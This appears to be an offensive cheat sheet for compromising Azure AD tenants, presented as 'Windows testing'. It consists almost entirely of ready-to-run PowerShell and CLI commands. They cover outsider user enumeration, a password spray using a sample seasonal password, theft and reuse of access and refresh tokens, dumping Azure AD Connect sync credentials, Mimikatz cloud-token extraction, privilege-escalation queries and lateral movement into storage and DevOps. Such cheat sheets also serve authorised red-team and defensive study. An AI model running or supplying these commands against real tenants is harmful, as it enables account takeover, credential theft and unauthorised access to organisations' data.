# Windows testing

## Initial Reconnaissance
```
Install-Module -Name Az -AllowClobber -Scope CurrentUser
Install-Module -Name AzureAD -Scope CurrentUser
Install-Module -Name MSOnline -Scope CurrentUser
Install-Module -Name AADInternals -Scope CurrentUser

# Alternative: ROADtools (Python-based, very powerful)
pip install roadrecon
```

## Enumeration Without Credentials
```powershell

# Check if Azure AD is in use
Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=user@targetdomain.com&xml=1"

# Enumerate valid email addresses / users
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -Domain "targetdomain.com"

# Get tenant information
Get-AADIntTenantID -Domain "targetdomain.com"
Get-AADIntLoginInformation -Domain "targetdomain.com"

# Check for specific users (valid/invalid)
# Returns different responses for valid vs invalid users
Invoke-WebRequest -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Method POST -Body '{"Username":"user@targetdomain.com"}' -ContentType "application/json"
```

## With Valid Credentials

```powershell
# Connect to Azure AD
Connect-AzureAD
# or
Connect-MsolService

# Get access token
$token = (Get-AzAccessToken).Token

# Basic enumeration
Get-AzureADUser -All $true | Select UserPrincipalName, DisplayName, ObjectId
Get-AzureADGroup -All $true
Get-AzureADGroupMember -ObjectId <group-id>
Get-AzureADDevice -All $true

# Find privileged users
Get-AzureADDirectoryRole | ForEach-Object {
    $role = $_
    Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | 
    Select @{N="Role";E={$role.DisplayName}}, DisplayName, UserPrincipalName
}

# Get tenant details
Get-AzureADTenantDetail
Get-MsolCompanyInformation

# Check MFA status
Get-MsolUser -All | Select DisplayName, UserPrincipalName, @{N="MFA Status"; E={$_.StrongAuthenticationRequirements.State}}

# Conditional Access Policies
Get-AzureADMSConditionalAccessPolicy

# Service Principals & App Registrations
Get-AzureADServicePrincipal -All $true
Get-AzureADApplication -All $true

# Check permissions
Get-AzureADServicePrincipal -All $true | ForEach-Object {
    $sp = $_
    Get-AzureADServiceAppRoleAssignment -ObjectId $_.ObjectId |
    Select @{N="ServicePrincipal";E={$sp.DisplayName}}, PrincipalDisplayName, ResourceDisplayName
}
```


## AADInternals (Powerful Post-Exploitation)

```powershell
# Get access token from current session
$token = Get-AADIntAccessTokenForAADGraph

# Export all Azure AD information
Export-AADIntAzureAD

# Password spray attack
Invoke-AADIntPasswordSprayAttack -Emails users.txt -Password "Winter2024!"

# Get authentication methods
Get-AADIntUserAuthenticationMethods -UserPrincipalName user@domain.com

# Check if PTA (Pass-Through Authentication) is enabled
Get-AADIntPTAAgents

# Backdoor Azure AD Sync
# If you compromise Azure AD Connect server
Get-AADIntSyncCredentials
```

## ROADtools (Alternative - Very Stealthy)

```
# Authenticate and gather data
roadrecon auth -u user@domain.com -p password
# or with device code
roadrecon auth --device-code

# Collect all data
roadrecon gather

# Analyze in GUI
roadrecon gui

# Query specific data
roadrecon dump --database roadrecon.db
```

## Token/Session Hijacking

```
# Extract tokens from browser/apps
Import-Module AADInternals

# Get tokens from cache
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Use stolen refresh token
$token = Get-AADIntAccessTokenForAADGraph -RefreshToken $stolenRefreshToken
```

## Privilege Escalation Checks

```
# Check for apps with dangerous permissions
Get-AzureADServicePrincipal -All $true | 
    Where-Object {$_.AppRoles.Value -contains "RoleManagement.ReadWrite.Directory"}

# Find users who can reset passwords
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Password Administrator'" | 
    Get-AzureADDirectoryRoleMember

# Check for guest users with high privileges
Get-AzureADUser -Filter "UserType eq 'Guest'" -All $true | 
    ForEach-Object {
        Get-AzureADUserMembership -ObjectId $_.ObjectId
    }

# Dynamic group memberships (can be exploited)
Get-AzureADMSGroup -All $true | Where-Object {$_.GroupTypes -contains "DynamicMembership"}
```

## Credential Harvesting


```
# If you have access to Azure AD Connect server
Import-Module AADInternals
Get-AADIntSyncCredentials

# Mimikatz for Azure tokens
privilege::debug
sekurlsa::cloudap

# Browser token extraction
Get-AADIntAccessTokenFromCache
```

## Lateral Movement Commands

```
# Enumerate Azure resources with current creds
Connect-AzAccount
Get-AzResource
Get-AzVM
Get-AzStorageAccount
Get-AzKeyVault

# Try accessing storage accounts
Get-AzStorageAccount | ForEach-Object {
    $ctx = New-AzStorageContext -StorageAccountName $_.StorageAccountName
    Get-AzStorageContainer -Context $ctx
}

# Check Azure DevOps access
az devops login
az devops project list
```
